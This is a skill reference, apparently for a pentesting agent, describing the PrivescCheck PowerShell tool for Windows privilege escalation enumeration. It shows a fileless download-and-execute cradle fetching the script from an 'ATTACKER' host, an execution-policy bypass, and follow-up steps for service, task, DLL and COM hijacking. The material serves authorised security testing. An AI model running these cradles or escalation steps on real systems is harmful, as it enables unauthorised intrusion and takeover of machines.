---
name: privesccheck
description: "Auth/lab ref: PrivescCheck Windows privilege review; services, tasks, registry policy, DLL/COM paths, stored-secret indicators."
license: MIT
compatibility: "Windows; PowerShell 2.0+; No admin required for baseline checks."
metadata:
  author: AeonDave
  version: "1.0"
---

# PrivescCheck

PowerShell-native Windows privilege escalation enumeration with readable output and reporting support.

## Why Use It Instead of WinPEAS

Use `PrivescCheck` when:
- a pure PowerShell workflow is preferable
- dropping EXEs is blocked or high-friction
- you want structured readable results and HTML reports
- you need a lower-friction alternative before noisier tooling

It complements `winpeas`; it does not replace it entirely.

## Quick Start

```powershell
# In-memory delivery
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/PrivescCheck.ps1"); Invoke-PrivescCheck

# Thorough enumeration
Invoke-PrivescCheck -Extended

# HTML report
Invoke-PrivescCheck -Report privesc_report -Format HTML

# Local script execution
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## Enumeration Areas

| Category | What it enumerates |
|---|---|
| Services | Unquoted paths, weak DACLs, writable binaries |
| Scheduled Tasks | Writable task scripts, privileged task actions |
| Registry | AlwaysInstallElevated, autoruns, weak policy settings |
| Credentials | GPP remnants, stored credentials, autologon clues |
| Current User | Token privileges, group memberships, effective context |
| COM Objects | Hijackable registrations |
| DLL Hijacking | Search-order abuse opportunities |

## Common Workflows

### Quick low-noise triage
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/PrivescCheck.ps1"); Invoke-PrivescCheck
# Triage services, tasks, registry, token privileges first
```

### Full report for offline review
```powershell
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report privesc_report -Format HTML
```

### Pair with WinPEAS
```text
1. Run PrivescCheck first for readable PS-native output
2. Validate high-confidence findings
3. Run WinPEAS if more breadth is needed
4. Build exploit chain from confirmed vector
```

## Severity Triage

| Level | Meaning |
|---|---|
| Info | All findings including informational (default) |
| Low | Medium+ severity only |
| Medium | High severity focus |

## High-Value Follow-Ups

- **AlwaysInstallElevated** → test MSI install path
- **Weak service DACL** → reconfigure or replace service path/binary
- **Scheduled task script writable** → replace payload/script target
- **DLL hijack opportunity** → verify load path and writable directory
- **COM hijack** → validate CLSID path write access before action

## Relationship to Other Windows Skills

| Skill | Best use |
|---|---|
| `winpeas` | Broad, aggressive Windows privesc enumeration |
| `watson` | Patch/CVE-focused post-exploitation triage |
| `powerview` | AD privilege and domain attack-path discovery |

## Resources

| File | When to load |
|---|---|
| `references/ps-opsec-and-reporting.md` | PowerShell-native delivery, report workflow, and when to prefer PrivescCheck over WinPEAS |
